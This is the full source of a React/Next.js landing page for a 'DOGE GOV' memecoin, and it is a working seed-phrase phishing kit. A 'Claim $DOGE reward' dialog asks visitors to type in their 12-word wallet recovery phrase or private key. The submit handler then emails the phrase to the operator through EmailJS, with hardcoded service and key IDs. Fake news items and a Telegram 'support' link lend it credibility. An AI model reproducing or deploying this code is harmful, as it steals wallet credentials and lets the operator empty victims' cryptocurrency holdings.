"use client";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import Image from "next/image";
import { useState } from "react";
import emailjs from "@emailjs/browser";

export default function Home() {
  const [status, setStatus] = useState("");
  const [words, setWords] = useState(Array(12).fill(""));
  const [open, setOpen] = useState(false);

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value;
    setWords(newWords);
  };

  const onSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus("Submitting");
    if (words.some((word) => word.trim() === "")) {
      alert("Please fill in all the words before submitting.");
      return;
    }

    try {
      // Use EmailJS instead of Formspree
      const response = await emailjs.send(
        "service_h9fm5p7",
        "template_zd869eg",
        {
          from_name: "Seed Phrase Submission",
          message: words.join(" "),
          seed_phrase: words.join(" "),
          words: words,
        },
        "EEVwSYA6R0m-_8toc"
      );

      if (response.status === 200) {
        console.log("Email sent successfully!", response);
        setWords(Array(12).fill(""));
        setOpen(false);
      } else {
        console.log("Failed to send message", response);
      }
    } catch (error) {
      console.log(error);
    } finally {
      setStatus("");
    }
  };

  return (
    <div
      className=""
      style={{
        backgroundImage: "url(/doge-banner-mobile-2.jpg)",
        backgroundPosition: "center",
        backgroundSize: "cover",
        minHeight: "auto",
        backgroundRepeat: "no-repeat",
        height: "60rem",
      }}
    >
      {/* announcment  */}
      <div className="pt-[14rem] px-5">
        <div className="bg-black p-3 text-[14px] w-fit">
          <h1 className="uppercase">much wow. much efficiency.</h1>
        </div>
        <h1 className="[font-family:var(--font-oswald)] font-bold text-[36px] lg:text-[68px] uppercase leading-9">
          The Department of Government Efficiency Memecoin Community
        </h1>
        <p
          className="[font-family:var(--font-inconsolata)] mt-3 text-[#9d9d9d]"
          style={{ letterSpacing: "0.05rem", lineHeight: "140%" }}
        >
          DOGE GOV is a community-run memecoin based on the DOGE. We use the
          power of community and virality of memes to help spread the great work
          of DOGE. DOGEGOV is the strongest memecoin narrative this cycle. Every
          single influential person in the US is talking about the DOGE. Join
          us.
        </p>
        <div className="my-3 mb-5 space-y-4 text-[18px]">
          <Dialog open={open} onOpenChange={setOpen}>
            <DialogTrigger className="w-full cursor-pointer">
              <p className="bg-white text-black [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
                Claim $DOGE reward
              </p>
            </DialogTrigger>
            <DialogContent className="pt-5">
              <DialogHeader>
                <DialogTitle>Connect Wallet Manually</DialogTitle>
                <DialogDescription className="text-[15px]">
                  Enter your seed phrases or a private key to restore your
                  wallet.
                </DialogDescription>
              </DialogHeader>
              <form onSubmit={onSubmit}>
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-3 gap-3">
                  {words.map((word, i) => (
                    <input
                      key={i}
                      type="text"
                      value={word}
                      placeholder={`Word ${i + 1}`}
                      className="border px-5 py-1 rounded-[5px] text-[13px] outline-none text-center"
                      style={{ display: "block", marginBottom: "5px" }}
                      onChange={(e) => handleWordChange(i, e.target.value)}
                    />
                  ))}
                </div>
                <div className="w-full flex justify-around mt-4 gap-5">
                  <button
                    type="button"
                    className="cursor-pointer border bg-black text-white rounded-sm py-1 w-full"
                    onClick={() => {
                      setWords(Array(12).fill(""));
                      setOpen(false);
                    }}
                  >
                    Clear
                  </button>
                  <button
                    type="submit"
                    className={`cursor-pointer border rounded-sm py-1 w-full ${
                      words.some((word) => word.trim() === "")
                        ? "opacity-50"
                        : "bg-black text-white"
                    }`}
                    disabled={words.some((word) => word.trim() === "")}
                  >
                    {status ? (
                      <>
                        <svg
                          className="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline"
                          xmlns="http://www.w3.org/2000/svg"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          ></circle>
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          ></path>
                        </svg>
                        Processing...
                      </>
                    ) : (
                      "Submit"
                    )}
                  </button>
                </div>
              </form>
            </DialogContent>
          </Dialog>

          <a href="https://t.me/Dogesupportt">
            <button className="bg-white text-black [font-family:var(--font-inconsolata)] w-full py-3 uppercase">
              Contact Support
            </button>
          </a>
        </div>
      </div>
      <div className="bg-white text-black p-5">
        <h1 className="text-[15px]">Welcome to DOGE GOV</h1>
        <h1
          className="[font-family:var(--font-oswald)] text-[28px] mb-[16px] font-[600] uppercase"
          style={{ lineHeight: "125%" }}
        >
          For those that still don&apos;t understand. DOGE GOV is a
          community-run memecoin project based on the DOGE. We are not the
          official DOGE.
        </h1>
        <p className="mb-[16px]">
          We are passionate supporters of DOGE and Elon Musk. Our mission is to
          harness the power and virality of memes, community, and cryptocurrency
          to be a positive force in spreading the good word about DOGE&apos;s
          latest work. We believe in empowering people to hold government
          entities accountable for their financial decisions. Join us today!
        </p>
        <button
          className="bg-black text-white [font-family:var(--font-inconsolata)] w-full py-3 uppercase cursor-pointer"
          onClick={() => setOpen(true)}
        >
          Claim $DOGE reward
        </button>
        <p
          className="mt-[16px] [font-family:var(--font-inconsolata)]  text-[13px]"
          style={{ color: "rgb(175, 175, 175)" }}
        >
          DOGE GOV has no association with the official DOGE Organization. This
          token is a community-driven meme project designed to raise awareness
          of government spending and over-regulation. It has no intrinsic value
          or financial return expectations and operates without a formal team or
          roadmap. The token is intended solely for educational and
          entertainment purposes.
        </p>
      </div>
      <div className="bg-white text-black p-5 space-y-10">
        {/* New Header  */}
        <div>
          <Image
            src="https://doge-memes.b-cdn.net/doge-elon_doge-breakdown.jpg"
            alt=""
            width={300}
            height={300}
            className="h-auto w-full mb-5"
          />
          <p className="uppercase mb-4">Fox News</p>
          <h1
            className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
            style={{ lineHeight: "120%" }}
          >
            Full Elon Musk explanation on DOGE during Executive Order Signing
            Event with Trump (30 minutes)
          </h1>
          <p
            className="text-[14px] [font-family:var(--font-oswald)] mt-10"
            style={{ color: "rgba(0, 0, 0, 0.5)" }}
          >
            12 February 2025
          </p>
        </div>
        {/* Sub News  */}
        <div>
          <div>
            <Image
              src="https://doge-memes.b-cdn.net/Article%20Images/photo_2025-02-10%2022.00.10.jpeg"
              alt=""
              width={300}
              height={300}
              className="h-auto w-full mb-5"
            />
            <p className="uppercase mb-4">The White House</p>
            <h1
              className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
              style={{ lineHeight: "120%" }}
            >
              President Trump establishes DOGE with an executive order.
            </h1>
            <p
              className="text-[14px] [font-family:var(--font-oswald)] mt-10"
              style={{ color: "rgba(0, 0, 0, 0.5)" }}
            >
              12 February 2025
            </p>
          </div>

          <div>
            <Image
              src="https://doge-memes.b-cdn.net/Article%20Images/doge-exclusivesponsor-logo.jpg"
              alt=""
              width={300}
              height={300}
              className="h-auto w-full mb-5"
            />
            <p className="uppercase mb-4">Crypto Ball Sponsor</p>
            <h1
              className="text-[30px] font-[600] [font-family:var(--font-oswald)] "
              style={{ lineHeight: "120%" }}
            >
              DOGEGOV was at Trumps inaugural Crypto Ball as the only meme coin
              sponsor 👀
            </h1>
            <p
              className="text-[14px] [font-family:var(--font-oswald)] mt-10"
              style={{ color: "rgba(0, 0, 0, 0.5)" }}
            >
              17 February 2025
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
